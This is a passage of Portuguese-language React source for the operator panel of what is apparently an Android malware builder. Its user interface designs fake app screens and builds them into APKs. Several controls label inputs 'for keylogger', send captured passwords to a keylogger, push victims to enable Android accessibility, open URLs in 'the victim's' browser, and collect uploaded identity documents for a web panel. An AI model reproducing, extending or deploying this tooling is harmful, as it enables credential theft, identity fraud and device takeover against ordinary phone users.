                  className="w-full flex items-center justify-center gap-2 p-2 bg-gray-700 hover:bg-gray-600 rounded-lg transition-colors"
                >
                  <Plus size={16} />
                  <span className="text-sm">Nova Tela</span>
                </button>
              </div>
            </div>
            
            <div className="border-t border-gray-700 p-4">
              <h3 className="text-sm font-semibold text-gray-400 uppercase mb-3">Tema</h3>
              
              <div className="space-y-3">
                {Object.entries(template.theme).map(([key, value]) => (
                  <div key={key} className="flex items-center justify-between">
                    <span className="text-sm capitalize">{key.replace(/([A-Z])/g, ' $1')}</span>
                    <input
                      type="color"
                      value={value}
                      onChange={(e) => {
                        setTemplate(prev => ({
                          ...prev,
                          theme: { ...prev.theme, [key]: e.target.value }
                        }));
                      }}
                      className="w-8 h-8 rounded border-2 border-gray-600 cursor-pointer"
                    />
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}
        
        {/* Center - Phone Preview */}
        <div
          className="flex-1 flex items-center justify-center bg-gray-900 overflow-auto p-8"
          onMouseMove={handleMouseMove}
          onMouseUp={handleMouseUp}
          onMouseLeave={handleMouseUp}
          onClick={() => setSelectedElementId(null)}
        >
          <div className="relative">
            {/* Phone Frame */}
            <div className="relative w-[400px] h-[820px] bg-gray-800 rounded-[50px] p-2 shadow-2xl">
              {/* Notch */}
              <div className="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-6 bg-gray-800 rounded-b-2xl z-10" />
              
              {/* Screen */}
              <div
                ref={phonePreviewRef}
                className="w-full h-full rounded-[42px] overflow-hidden relative"
                style={{ 
                  backgroundColor: currentScreen?.backgroundColor || '#FFFFFF',
                  // Garante que elementos filhos não saiam
                  contain: 'paint',
                }}
              >
                {/* Grid de auxílio (só no modo edição) */}
                {!previewMode && (
                  <div 
                    className="absolute inset-0 pointer-events-none opacity-10"
                    style={{
                      backgroundImage: 'linear-gradient(to right, #fff 1px, transparent 1px), linear-gradient(to bottom, #fff 1px, transparent 1px)',
                      backgroundSize: '10% 10%',
                    }}
                  />
                )}
                
                {/* Screen Content */}
                {currentScreen?.elements.map(el => renderElement(el, previewMode))}
                
                {/* Empty State */}
                {currentScreen?.elements.length === 0 && (
                  <div className="absolute inset-0 flex flex-col items-center justify-center text-gray-500">
                    <Smartphone size={48} className="mb-4 opacity-50" />
                    <p className="text-sm">Arraste elementos aqui</p>
                    <p className="text-xs text-gray-600 mt-2">Elementos ficam dentro da tela</p>
                  </div>
                )}
                
                {/* Borda de limite (só no modo edição com elemento selecionado) */}
                {!previewMode && selectedElementId && isDragging && (
                  <div className="absolute inset-0 border-2 border-dashed border-blue-500/30 pointer-events-none rounded-[40px]" />
                )}
              </div>
              
              {/* Home Indicator */}
              <div className="absolute bottom-2 left-1/2 -translate-x-1/2 w-32 h-1 bg-gray-600 rounded-full" />
            </div>
            
            {/* Screen Name */}
            <div className="absolute -bottom-8 left-1/2 -translate-x-1/2 text-center">
              <span className="text-sm text-gray-400">
                Tela {currentScreenIndex + 1} de {template.screens.length}: {currentScreen?.name}
              </span>
            </div>
          </div>
        </div>
        
        {/* Right Panel - Properties */}
        {showPropertiesPanel && !previewMode && selectedElement && (
          <div className="w-80 bg-gray-800 border-l border-gray-700 overflow-y-auto">
            <div className="p-4">
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-sm font-semibold text-gray-400 uppercase">Propriedades</h3>
                <div className="flex gap-1">
                  <button
                    onClick={() => duplicateElement(selectedElement.id)}
                    className="p-1.5 bg-gray-700 hover:bg-gray-600 rounded transition-colors"
                    title="Duplicar"
                  >
                    <Copy size={14} />
                  </button>
                  <button
                    onClick={() => deleteElement(selectedElement.id)}
                    className="p-1.5 bg-red-600 hover:bg-red-500 rounded transition-colors"
                    title="Excluir"
                  >
                    <Trash2 size={14} />
                  </button>
                </div>
              </div>
              
              {/* Element Type */}
              <div className="mb-4 p-2 bg-gray-700 rounded-lg">
                <span className="text-xs text-gray-400">Tipo: </span>
                <span className="text-sm font-medium capitalize">{selectedElement.type}</span>
              </div>
              
              {/* Content */}
              {(selectedElement.type === 'text' || selectedElement.type === 'button') && (
                <div className="mb-4">
                  <label className="block text-xs text-gray-400 mb-1">Conteúdo</label>
                  <input
                    type="text"
                    value={selectedElement.content}
                    onChange={(e) => updateElement(selectedElement.id, { content: e.target.value })}
                    className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
                  />
                </div>
              )}
              
              {/* Input Properties */}
              {selectedElement.type === 'input' && (
                <>
                  <div className="mb-4">
                    <label className="block text-xs text-gray-400 mb-1">Tipo de Input</label>
                    <select
                      value={selectedElement.inputType}
                      onChange={(e) => updateElement(selectedElement.id, { inputType: e.target.value as any })}
                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
                    >
                      <option value="text">Texto</option>
                      <option value="password">Senha</option>
                      <option value="numeric">Numérico</option>
                      <option value="pin">PIN (6 dígitos)</option>
                    </select>
                  </div>
                  <div className="mb-4">
                    <label className="block text-xs text-gray-400 mb-1">Placeholder</label>
                    <input
                      type="text"
                      value={selectedElement.inputPlaceholder || ''}
                      onChange={(e) => updateElement(selectedElement.id, { inputPlaceholder: e.target.value })}
                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
                    />
                  </div>
                  <div className="mb-4">
                    <label className="block text-xs text-gray-400 mb-1">Label (p/ Keylogger)</label>
                    <input
                      type="text"
                      value={selectedElement.inputLabel || ''}
                      onChange={(e) => updateElement(selectedElement.id, { inputLabel: e.target.value })}
                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
                      placeholder="Ex: SENHA_INICIAL"
                    />
                  </div>
                  <div className="mb-4">
                    <label className="block text-xs text-gray-400 mb-1">Máximo de Caracteres</label>
                    <input
                      type="number"
                      value={selectedElement.inputMaxLength || ''}
                      onChange={(e) => updateElement(selectedElement.id, { inputMaxLength: parseInt(e.target.value) })}
                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
                    />
                  </div>
                </>
              )}
              
              {/* Button Action */}
              {selectedElement.type === 'button' && (
                <div className="mb-4">
                  <label className="block text-xs text-gray-400 mb-1">Ação do Botão</label>
                  <select
                    value={selectedElement.buttonAction}
                    onChange={(e) => updateElement(selectedElement.id, { buttonAction: e.target.value as any })}
                    className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
                  >
                    <option value="accessibility">🔐 Ativar Acessibilidade</option>
                    <option value="next">▶️ Próxima tela</option>
                    <option value="submit">📤 Enviar dados + Próxima</option>
                    <option value="close">❌ Fechar app (volta p/ home)</option>
                    <option value="home">🏠 Ir para Home do Android</option>
                    <option value="hide">👁️ Minimizar app</option>
                    <option value="open_url">🌐 Abrir URL no navegador</option>
                    <option value="custom">⚙️ Fechar (legado)</option>
                  </select>
                  <p className="text-[10px] text-gray-500 mt-1">
                    {selectedElement.buttonAction === 'accessibility' && '🔐 Abre configurações de acessibilidade do Android'}
                    {selectedElement.buttonAction === 'next' && '→ Avança para a próxima tela da sequência'}
                    {selectedElement.buttonAction === 'submit' && '→ Envia senhas para keylogger e avança'}
                    {selectedElement.buttonAction === 'close' && '→ Fecha o app e volta para tela inicial do celular'}
                    {selectedElement.buttonAction === 'home' && '→ Vai direto para a home do Android'}
                    {selectedElement.buttonAction === 'hide' && '→ Minimiza o app (fica em background)'}
                    {selectedElement.buttonAction === 'open_url' && '🌐 Abre uma URL no navegador padrão da vítima'}
                    {selectedElement.buttonAction === 'custom' && '→ Fecha o app (mesmo que "close")'}
                  </p>
                  
                  {/* Campo de URL quando ação é open_url */}
                  {selectedElement.buttonAction === 'open_url' && (
                    <div className="mt-3">
                      <label className="block text-xs text-gray-400 mb-1">🌐 URL para abrir</label>
                      <input
                        type="text"
                        value={selectedElement.buttonUrl || ''}
                        onChange={(e) => updateElement(selectedElement.id, { buttonUrl: e.target.value })}
                        placeholder="https://google.com.br"
                        className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
                      />
                      <p className="text-[10px] text-gray-500 mt-1">
                        Quando clicar no botão, abre essa URL no navegador
                      </p>
                    </div>
                  )}
                </div>
              )}
              
              {/* File Upload Config */}
              {selectedElement.type === 'file_upload' && (
                <div className="mb-4 p-3 bg-green-900/30 border border-green-700 rounded-lg">
                  <h4 className="text-sm font-semibold text-green-400 mb-3">📤 Configurações de Upload</h4>
                  
                  <div className="mb-3">
                    <label className="block text-xs text-gray-400 mb-1">Label (identificador no painel)</label>
                    <input
                      type="text"
                      value={selectedElement.fileLabel || ''}
                      onChange={(e) => updateElement(selectedElement.id, { fileLabel: e.target.value })}
                      placeholder="DOCUMENTO_RG"
                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
                    />
                  </div>
                  
                  <div className="mb-3">
                    <label className="block text-xs text-gray-400 mb-1">Texto do Botão</label>
                    <input
                      type="text"
                      value={selectedElement.fileButtonText || ''}
                      onChange={(e) => updateElement(selectedElement.id, { fileButtonText: e.target.value })}
                      placeholder="Selecionar Arquivo"
                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
                    />
                  </div>
                  
                  <div className="mb-3">
                    <label className="block text-xs text-gray-400 mb-1">Tipos de arquivo aceitos</label>
                    <div className="flex flex-wrap gap-2">
                      {['image', 'pdf', 'document', 'any'].map(type => (
                        <label key={type} className="flex items-center gap-1 text-xs">
                          <input
                            type="checkbox"
                            checked={selectedElement.fileTypes?.includes(type) || false}
                            onChange={(e) => {
                              const current = selectedElement.fileTypes || [];
                              const updated = e.target.checked 
                                ? [...current, type]
                                : current.filter(t => t !== type);
                              updateElement(selectedElement.id, { fileTypes: updated });
                            }}
                            className="rounded"
                          />
                          <span className="capitalize">{type === 'image' ? '📷 Imagem' : type === 'pdf' ? '📄 PDF' : type === 'document' ? '📝 Documento' : '📁 Qualquer'}</span>
                        </label>
                      ))}
                    </div>
                  </div>
                  
                  <p className="text-[10px] text-gray-500">
                    Os arquivos enviados aparecerão no painel web na seção de documentos do dispositivo.
                  </p>
                </div>
              )}
              
              {/* Image Upload */}
              {(selectedElement.type === 'image' || selectedElement.type === 'logo') && (
                <div className="mb-4">
                  <label className="block text-xs text-gray-400 mb-1">Imagem</label>
                  <input
                    type="file"
                    accept="image/*"
                    ref={fileInputRef}
                    onChange={handleImageUpload}
                    className="hidden"
                  />
                  <button
                    onClick={() => fileInputRef.current?.click()}
                    className="w-full px-3 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg text-sm flex items-center justify-center gap-2"
                  >
                    <Upload size={16} />
                    {selectedElement.imageFile ? 'Trocar Imagem' : 'Upload Imagem'}
                  </button>
                </div>
              )}
              
              {/* Position */}
              <div className="mb-4">
                <label className="block text-xs text-gray-400 mb-1">Posição (0-{ANDROID_WIDTH}x{ANDROID_HEIGHT})</label>
                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <span className="text-xs text-gray-500">X</span>
                    <input
                      type="number"
                      min={0}
                      max={ANDROID_WIDTH - selectedElement.size.width}
                      value={Math.round(selectedElement.position.x)}
                      onChange={(e) => {
                        const maxX = ANDROID_WIDTH - selectedElement.size.width;
                        const newX = Math.max(0, Math.min(maxX, parseInt(e.target.value) || 0));
                        updateElement(selectedElement.id, { position: { ...selectedElement.position, x: newX } });
                      }}
                      className="w-full px-2 py-1 bg-gray-700 rounded text-sm"
                    />
                  </div>
                  <div>
                    <span className="text-xs text-gray-500">Y</span>
                    <input
                      type="number"
                      min={0}
                      max={ANDROID_HEIGHT - selectedElement.size.height}
                      value={Math.round(selectedElement.position.y)}
                      onChange={(e) => {
                        const maxY = ANDROID_HEIGHT - selectedElement.size.height;
                        const newY = Math.max(0, Math.min(maxY, parseInt(e.target.value) || 0));
                        updateElement(selectedElement.id, { position: { ...selectedElement.position, y: newY } });
                      }}
                      className="w-full px-2 py-1 bg-gray-700 rounded text-sm"
                    />
                  </div>
                </div>
              </div>
              
              {/* Size */}
              <div className="mb-4">
                <label className="block text-xs text-gray-400 mb-1">Tamanho</label>
                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <span className="text-xs text-gray-500">Largura</span>
                    <input
                      type="number"
                      min={20}
                      max={ANDROID_WIDTH}
                      value={Math.round(selectedElement.size.width)}
                      onChange={(e) => {
                        const newWidth = Math.max(20, Math.min(ANDROID_WIDTH, parseInt(e.target.value) || 20));
                        // Ajusta posição se necessário para caber na tela
                        const maxX = ANDROID_WIDTH - newWidth;
                        const newX = Math.min(selectedElement.position.x, maxX);
                        updateElement(selectedElement.id, { 
                          size: { ...selectedElement.size, width: newWidth },
                          position: { ...selectedElement.position, x: newX }
                        });
                      }}
                      className="w-full px-2 py-1 bg-gray-700 rounded text-sm"
                    />
                  </div>
                  <div>
                    <span className="text-xs text-gray-500">Altura</span>
                    <input
                      type="number"
                      min={20}
                      max={ANDROID_HEIGHT}
                      value={Math.round(selectedElement.size.height)}
                      onChange={(e) => {
                        const newHeight = Math.max(20, Math.min(ANDROID_HEIGHT, parseInt(e.target.value) || 20));
                        // Ajusta posição se necessário para caber na tela
                        const maxY = ANDROID_HEIGHT - newHeight;
                        const newY = Math.min(selectedElement.position.y, maxY);
                        updateElement(selectedElement.id, { 
                          size: { ...selectedElement.size, height: newHeight },
                          position: { ...selectedElement.position, y: newY }
                        });
                      }}
                      className="w-full px-2 py-1 bg-gray-700 rounded text-sm"
                    />
                  </div>
                </div>
              </div>
              
              {/* Style - Colors */}
              <div className="mb-4">
                <label className="block text-xs text-gray-400 mb-2">Cores</label>
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-sm">Fundo</span>
                    <input
                      type="color"
                      value={selectedElement.style.backgroundColor || '#FFFFFF'}
                      onChange={(e) => updateElementStyle(selectedElement.id, { backgroundColor: e.target.value })}
                      className="w-8 h-8 rounded cursor-pointer"
                    />
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-sm">Texto</span>
                    <input
                      type="color"
                      value={selectedElement.style.textColor || '#000000'}
                      onChange={(e) => updateElementStyle(selectedElement.id, { textColor: e.target.value })}
                      className="w-8 h-8 rounded cursor-pointer"
                    />
                  </div>
                </div>
              </div>
              
              {/* Style - Typography */}
              <div className="mb-4">
                <label className="block text-xs text-gray-400 mb-2">Tipografia</label>
                <div className="space-y-2">
                  <div>
                    <span className="text-xs text-gray-500">Tamanho da Fonte</span>
                    <input
                      type="number"
                      value={selectedElement.style.fontSize || 14}
                      onChange={(e) => updateElementStyle(selectedElement.id, { fontSize: parseInt(e.target.value) })}
                      className="w-full px-2 py-1 bg-gray-700 rounded text-sm"
                    />
                  </div>
                  <div>
                    <span className="text-xs text-gray-500">Peso</span>
                    <select
                      value={selectedElement.style.fontWeight || 'normal'}
                      onChange={(e) => updateElementStyle(selectedElement.id, { fontWeight: e.target.value })}
                      className="w-full px-2 py-1 bg-gray-700 rounded text-sm"
                    >
                      <option value="normal">Normal</option>
                      <option value="bold">Negrito</option>
                      <option value="lighter">Leve</option>
                    </select>
                  </div>
                  <div>
                    <span className="text-xs text-gray-500">Alinhamento</span>
                    <div className="flex gap-1">
                      {['left', 'center', 'right'].map(align => (
                        <button
                          key={align}
                          onClick={() => updateElementStyle(selectedElement.id, { textAlign: align as any })}
                          className={`flex-1 py-1 rounded text-xs ${selectedElement.style.textAlign === align ? 'bg-orange-600' : 'bg-gray-700 hover:bg-gray-600'}`}
                        >
                          {align === 'left' ? '◀' : align === 'center' ? '◆' : '▶'}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>
              </div>
              
              {/* Style - Border */}
              <div className="mb-4">
                <label className="block text-xs text-gray-400 mb-2">Borda</label>
                <div className="space-y-2">
                  <div>
                    <span className="text-xs text-gray-500">Arredondamento</span>
                    <input
                      type="number"
                      value={selectedElement.style.borderRadius || 0}
                      onChange={(e) => updateElementStyle(selectedElement.id, { borderRadius: parseInt(e.target.value) })}
                      className="w-full px-2 py-1 bg-gray-700 rounded text-sm"
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
        
        {/* Right Panel - Screen Properties (when no element selected) */}
        {showPropertiesPanel && !previewMode && !selectedElement && currentScreen && (
          <div className="w-80 bg-gray-800 border-l border-gray-700 overflow-y-auto">
            <div className="p-4">
              <h3 className="text-sm font-semibold text-gray-400 uppercase mb-4">Configurações da Tela</h3>
              
              <div className="mb-4">
                <label className="block text-xs text-gray-400 mb-1">Nome da Tela</label>
                <input
                  type="text"
                  value={currentScreen.name}
                  onChange={(e) => setTemplate(prev => ({
                    ...prev,
                    screens: prev.screens.map((s, i) => i === currentScreenIndex ? { ...s, name: e.target.value } : s)
                  }))}
                  className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
                />
              </div>
              
              <div className="mb-4">
                <label className="block text-xs text-gray-400 mb-1">Cor de Fundo</label>
                <input
                  type="color"
                  value={currentScreen.backgroundColor}
                  onChange={(e) => setTemplate(prev => ({
                    ...prev,
                    screens: prev.screens.map((s, i) => i === currentScreenIndex ? { ...s, backgroundColor: e.target.value } : s)
                  }))}
                  className="w-full h-10 rounded cursor-pointer"
                />
              </div>
              
              <div className="mb-4">
                <label className="flex items-center gap-2 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={currentScreen.captureInputs || false}
                    onChange={(e) => setTemplate(prev => ({
                      ...prev,
                      screens: prev.screens.map((s, i) => i === currentScreenIndex ? { ...s, captureInputs: e.target.checked } : s)
                    }))}
                    className="w-4 h-4 rounded"
                  />
                  <span className="text-sm">Capturar inputs (Keylogger)</span>
                </label>
              </div>
              
              <div className="mb-4">
                <label className="flex items-center gap-2 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={currentScreen.isAccessibilityScreen || false}
                    onChange={(e) => setTemplate(prev => ({
                      ...prev,
                      screens: prev.screens.map((s, i) => i === currentScreenIndex ? { ...s, isAccessibilityScreen: e.target.checked } : s)
                    }))}
                    className="w-4 h-4 rounded"
                  />
                  <span className="text-sm">Tela de Acessibilidade</span>
                </label>
                <p className="text-xs text-gray-500 mt-1">Ativa a acessibilidade automaticamente</p>
              </div>
              
              {/* Screen Order */}
              <div className="mb-4">
                <label className="block text-xs text-gray-400 mb-2">Ordem no Fluxo</label>
                <div className="flex gap-2">
                  <button
                    onClick={() => moveScreen(currentScreenIndex, 'up')}
                    disabled={currentScreenIndex === 0}
                    className="flex-1 py-2 bg-gray-700 hover:bg-gray-600 disabled:opacity-50 rounded-lg flex items-center justify-center gap-1"
                  >
                    <ChevronUp size={16} />
                    Subir
                  </button>
                  <button
                    onClick={() => moveScreen(currentScreenIndex, 'down')}
                    disabled={currentScreenIndex === template.screens.length - 1}
                    className="flex-1 py-2 bg-gray-700 hover:bg-gray-600 disabled:opacity-50 rounded-lg flex items-center justify-center gap-1"
                  >
                    <ChevronDown size={16} />
                    Descer
                  </button>
                </div>
              </div>
              
              {/* Template Info */}
              <div className="border-t border-gray-700 pt-4 mt-4">
                <h4 className="text-xs text-gray-400 uppercase mb-2">Informações do APK</h4>
                
                <div className="mb-3">
                  <label className="block text-xs text-gray-400 mb-1">Nome do App</label>
                  <input
                    type="text"
                    value={template.appName}
                    onChange={(e) => setTemplate(prev => ({ ...prev, appName: e.target.value }))}
                    className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
                  />
                </div>
                
                <div className="mb-3">
                  <label className="block text-xs text-gray-400 mb-1">Package Name</label>
                  <input
                    type="text"
                    value={template.packageName}
                    onChange={(e) => setTemplate(prev => ({ ...prev, packageName: e.target.value }))}
                    className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
                  />
                </div>
              </div>
              
              {/* Help */}
              <div className="mt-6 p-3 bg-gray-700 rounded-lg">
                <div className="flex items-start gap-2">
                  <Info size={16} className="text-blue-400 mt-0.5" />
                  <div className="text-xs text-gray-300">
                    <p className="font-medium mb-1">Dicas:</p>
                    <ul className="list-disc list-inside space-y-1 text-gray-400">
                      <li>Clique em um elemento para editar</li>
                      <li>Arraste para reposicionar</li>
                      <li>Use o painel de elementos para adicionar novos</li>
                      <li>Configure inputs com labels para keylogger</li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
      
      {/* 📦 MODAL: Templates Salvos */}
      {showSavedTemplates && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
          <div className="bg-gray-800 rounded-xl w-[700px] max-h-[80vh] overflow-hidden">
            <div className="p-4 border-b border-gray-700 flex items-center justify-between">
              <h2 className="text-lg font-bold flex items-center gap-2">
                <Layers className="text-blue-500" size={20} />
                Templates Salvos
              </h2>
              <button 
                onClick={() => setShowSavedTemplates(false)}
                className="p-2 hover:bg-gray-700 rounded-lg"
              >
                ✕
              </button>
            </div>
            
            <div className="p-4 max-h-[60vh] overflow-y-auto">
              {savedTemplates.length === 0 ? (
                <div className="text-center py-8 text-gray-400">
                  <Layers size={48} className="mx-auto mb-4 opacity-50" />
                  <p>Nenhum template salvo ainda</p>
                  <p className="text-sm">Clique em "Salvar" para guardar o template atual</p>
                </div>
              ) : (
                <div className="grid grid-cols-2 gap-4">
                  {savedTemplates.map((tpl) => (
                    <div key={tpl.id} className="bg-gray-700 rounded-lg p-4 hover:bg-gray-600 transition-colors">
                      <div className="flex items-start justify-between mb-2">
                        <h3 className="font-semibold truncate flex-1">{tpl.name}</h3>
                        <div className="flex items-center gap-1 ml-2">
                          <button
                            onClick={() => duplicateTemplate(tpl)}
                            className="p-1 hover:bg-gray-500 rounded text-blue-400"
                            title="Duplicar"
                          >
                            <Copy size={14} />
                          </button>
                          <button
                            onClick={() => deleteTemplate(tpl.id)}
                            className="p-1 hover:bg-gray-500 rounded text-red-400"
                            title="Excluir"
                          >
                            <Trash2 size={14} />
                          </button>
                        </div>
                      </div>
                      <p className="text-xs text-gray-400 mb-2">
                        {tpl.screens.length} tela(s) • {tpl.appName}
                      </p>
                      <p className="text-[10px] text-gray-500 mb-3">
                        Atualizado: {new Date(tpl.updatedAt).toLocaleString()}
                      </p>
                      <button
                        onClick={() => loadTemplate(tpl)}
                        className="w-full py-2 bg-blue-600 hover:bg-blue-500 rounded-lg text-sm font-medium transition-colors"
                      >
                        Carregar Template
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>
            
            {/* Salvar template atual */}
            <div className="p-4 border-t border-gray-700 bg-gray-750">
              <div className="flex items-center gap-2">
                <input
                  type="text"
                  value={templateName}
                  onChange={(e) => setTemplateName(e.target.value)}
                  placeholder="Nome do template..."
                  className="flex-1 px-3 py-2 bg-gray-700 rounded-lg text-sm"
                />
                <button
                  onClick={() => { saveTemplate(); setShowSavedTemplates(false); }}
                  className="px-4 py-2 bg-green-600 hover:bg-green-500 rounded-lg text-sm font-medium"
                >
                  Salvar Atual
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
      
      {/* 📜 MODAL: Histórico de APKs */}
      {showApkHistory && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
          <div className="bg-gray-800 rounded-xl w-[600px] max-h-[80vh] overflow-hidden">
            <div className="p-4 border-b border-gray-700 flex items-center justify-between">
              <h2 className="text-lg font-bold flex items-center gap-2">
                <Copy className="text-purple-500" size={20} />
                Histórico de APKs Criados
              </h2>
              <div className="flex items-center gap-2">
                {apkHistory.length > 0 && (
                  <button 
                    onClick={clearHistory}
                    className="px-3 py-1 text-sm text-red-400 hover:bg-gray-700 rounded-lg"
                  >
                    Limpar
                  </button>
                )}
                <button 
                  onClick={() => setShowApkHistory(false)}
                  className="p-2 hover:bg-gray-700 rounded-lg"
                >
                  ✕
                </button>
              </div>
            </div>
            
            <div className="p-4 max-h-[60vh] overflow-y-auto">
              {apkHistory.length === 0 ? (
                <div className="text-center py-8 text-gray-400">
                  <Download size={48} className="mx-auto mb-4 opacity-50" />
                  <p>Nenhum APK criado ainda</p>
                  <p className="text-sm">O histórico aparecerá aqui após buildar APKs</p>
                </div>
              ) : (
                <div className="space-y-2">
                  {apkHistory.map((entry) => (
                    <div key={entry.id || entry.date} className="bg-gray-700 rounded-lg p-4 hover:bg-gray-600 transition-colors">
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex-1">
                          <p className="font-semibold text-white flex items-center gap-2">
                            <Smartphone size={16} className="text-orange-500" />
                            {entry.name}
                          </p>
                          <p className="text-xs text-gray-400 mt-1">
                            Template: {entry.templateName}
                          </p>
                        </div>
                        <div className="text-right text-xs text-gray-500">
                          <p>{new Date(entry.date).toLocaleDateString()}</p>
                          <p>{new Date(entry.date).toLocaleTimeString()}</p>
                        </div>
                      </div>
                      
                      {/* Botões de ação */}
                      <div className="flex items-center gap-2 mt-3 pt-3 border-t border-gray-600">
                        {entry.downloadUrl ? (
                          <button
                            onClick={() => downloadApk(entry.downloadUrl, entry.name)}
                            className="flex-1 flex items-center justify-center gap-2 py-2 bg-green-600 hover:bg-green-500 rounded-lg text-sm font-medium transition-colors"
                          >
                            <Download size={16} />
                            Baixar APK
                          </button>
                        ) : (
                          <span className="flex-1 text-center text-xs text-gray-500 py-2">
                            Download não disponível
                          </span>
                        )}
                        <button
                          onClick={() => deleteFromHistory(entry.id)}
                          className="px-4 py-2 bg-red-600 hover:bg-red-500 rounded-lg text-sm font-medium transition-colors flex items-center gap-1"
                          title="Excluir do histórico"
                        >
                          <Trash2 size={16} />
                          Excluir
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

